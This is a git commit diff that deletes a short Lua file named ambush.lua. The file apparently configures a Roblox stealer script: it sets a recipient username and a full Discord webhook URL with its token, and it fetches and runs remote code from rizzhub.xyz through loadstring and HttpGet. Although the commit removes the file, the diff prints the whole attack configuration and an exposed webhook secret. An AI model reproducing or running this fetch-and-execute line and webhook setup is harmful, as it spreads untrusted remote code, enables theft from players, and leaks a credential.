49fefe1f7497ef332e2e367497e213668774f466
zVladd <130866135+zVladd@users.noreply.github.com>
2023-04-16 21:23:45 +0300

    Update and rename ambush.lua to Begwula

--- ambush.lua
+++
@@ -1,3 +0,0 @@
-UserName = "nosteal417"
-Webhook = "https://discord.com/api/webhooks/1095596728327094303/qZz0rbvkGuEtsw4gC2A-6VqpRJgmAdFHbMq1o8Hjx9OzGspCzgehNmmtL7FVPwyz3c_K"
-loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
